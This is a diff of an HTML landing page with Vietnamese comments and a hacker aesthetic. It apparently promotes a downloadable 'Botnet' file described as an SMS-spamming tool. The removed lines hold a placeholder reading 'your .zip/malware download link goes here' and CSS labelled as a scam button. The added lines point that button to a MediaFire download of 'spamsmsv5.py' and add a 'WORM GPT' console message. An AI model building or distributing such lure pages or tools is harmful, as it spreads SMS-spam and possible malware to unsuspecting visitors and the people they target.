@@ -21,8 +21,8 @@
             color: #00ff41; 
             font-family: 'Courier New', Courier, monospace;
             box-sizing: border-box;
-            user-select: none; 
-            touch-action: none; 
+            user-select: none; /* FIX ZOOM/PHÓNG TO - NGĂN CHẶN CHỌN TEXT */
+            touch-action: none; /* FIX ZOOM/PHÓNG TO - NGĂN CHẶN TƯƠNG TÁC CẢM ỨNG CÓ THỂ GÂY ZOOM */
         }
         
         /* POPUP CẢNH BÁO CỦA ANH VINH */
@@ -32,7 +32,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.95); 
+            background-color: rgba(0, 0, 0, 0.95); /* Giữ lại nền mờ đen */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -41,13 +41,14 @@
         }
 
         .popup-content {
-            background-color: transparent; 
-            border: none; 
+            /* CHỈNH TRONG SUỐT VÀ BỎ VIỀN CỨNG */
+            background-color: transparent; /* TRONG SUỐT */
+            border: none; /* KHÔNG VIỀN CỨNG */
             border-radius: 5px;
-            padding: 10px; 
+            padding: 10px; /* NHỎ GỌN HƠN */
             width: 95%;
-            max-width: 320px; 
-            box-shadow: 0 0 10px #ff00ea; 
+            max-width: 320px; /* NHỎ GỌN HƠN */
+            box-shadow: 0 0 10px #ff00ea; /* CHỈ GIỮ LẠI BÓNG MỜ TÍM HỒNG */
             pointer-events: auto;
         }
 
@@ -59,7 +60,7 @@
         }
 
         .popup-content p {
-            color: #ffffff; 
+            color: #ffffff; /* Giữ màu trắng cho dễ đọc trên nền tối */
             font-size: 0.9em;
             font-weight: 500;
             line-height: 1.4;
@@ -71,7 +72,8 @@
         }
 
         #close-popup {
-            background-color: #CC0000; 
+            /* CHỈNH MÀU ĐỎ ĐẬM CHO NÚT ĐÓNG */
+            background-color: #CC0000; /* ĐỎ ĐẬM */
             color: #ffffff;
             border: none;
             padding: 8px 15px;
@@ -340,28 +342,6 @@
             from { opacity: 0.6; }
             to { opacity: 1.0; }
         }
-        
-        /* CSS MỚI CHO NÚT LỪA ĐẢO TỐI GIẢN */
-        .simple-access-button {
-            border: 3px solid #ff00ea; /* Viền Tím hồng nổi bật */
-            padding: 10px; 
-            margin: 6px 0 0 0; 
-            background-color: rgba(255, 0, 234, 0.1); 
-            border-radius: 8px;
-            box-shadow: 0 0 10px #ff00ea;
-            transition: transform 0.2s;
-            cursor: pointer; 
-        }
-        .simple-access-button h2 {
-            font-size: 1.1em; 
-            margin: 0; 
-            color: #ff00ea; /* Màu chữ Tím hồng */
-            text-shadow: 0 0 7px #ff00ea, 0 0 1px #ffffff;
-        }
-        .simple-access-button:hover {
-            transform: scale(1.03);
-            box-shadow: 0 0 20px #ff00ea;
-        }
 
     </style>
 </head>
@@ -394,7 +374,7 @@
 </script>
 
 <script>
-    // CODE TẠO HIỆU ỨNG TEXT VÀ HEART RƠI
+    // TRÁI TIM XANH LÁ VÀ SIÊU NHỎ
     const hackerTexts = [
         "NỜ VINH IOS", "BOTNET", "HACKER", 
     ];
@@ -462,17 +442,17 @@
         </div>
 
         
-        <a href="javascript:alert('Link tải file .zip/mã độc của mày đặt ở đây!')" class="inner-frame-link">
-            <div id="capture-button" class="simple-access-button">
-                <h2>CLICK ĐỂ XÁC NHẬN TẢI FILE VIP</h2> 
+        <a href="https://www.mediafire.com/file/zgqfm52703h0chp/spamsmsv5.py/file" class="inner-frame-link" target="_blank">
+            <div class="inner-frame">
+                <h2>File Botnet Bấm Vào Đây</h2> 
+                <p>Ấn vào đây để tải tool Spam SMS V5 VIP!</p>
+                <div id="random-music-info" style="margin-top: 5px;"></div>
             </div>
         </a>
         </div>
 </div>
 
     <div class="footer-text">PYTHON BOTNET LIÊN HỆ</div>
-
-    <div id="random-music-info" style="margin-top: 5px;"></div>
 
     <div style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden;">
         <iframe id="youtube-audio"
@@ -485,13 +465,16 @@
     </div>
 
     <script>
+        // Thằng chó này là code YouTube API để đảm bảo nhạc chạy mượt mà
         let player;
+        
+        // Cập nhật ID nhạc mặc định và danh sách nhạc
         let currentVideoId = 'opfX05eVLAo'; 
         const musicList = [ 
-            'opfX05eVLAo', 
-            '8fGulQZ0QHY', 
-            'WAw_8GjjF5M', 
-            'qQDjCiyFIiY', 
+            'opfX05eVLAo', // Link 1
+            '8fGulQZ0QHY', // Link 2
+            'WAw_8GjjF5M', // Link 3
+            'qQDjCiyFIiY', // Link 4
         ];
         let currentMusicIndex = 0; 
 
@@ -522,17 +505,21 @@
             button.addEventListener('click', () => {
                 event.target.playVideo(); 
                 button.style.display = 'none'; 
+                console.log("[WORM GPT - ANH VINH] Đã buộc nhạc chạy thành công!");
                 updateMusicInfo(currentVideoId);
+                // Bắt đầu phát ngẫu nhiên từ bài đầu tiên trong list
                 playNextRandomMusic(true); 
             });
         }
 
         function onPlayerStateChange(event) {
+            // Nếu nhạc kết thúc, chuyển sang bài ngẫu nhiên
             if (event.data === YT.PlayerState.ENDED) {
                 playNextRandomMusic(false); 
             }
         }
 
+        // isInitialStart: Bắt đầu lần đầu thì không cần random, dùng luôn bài đầu tiên
         function playNextRandomMusic(isInitialStart) {
             if (musicList.length === 0) return;
 
@@ -548,6 +535,7 @@
             currentMusicIndex = newIndex;
             currentVideoId = musicList[currentMusicIndex];
             
+            // Dùng loadVideoById để đảm bảo tính năng Random hoạt động đúng
             player.loadVideoById(currentVideoId); 
             player.playVideo();
             updateMusicInfo(currentVideoId);
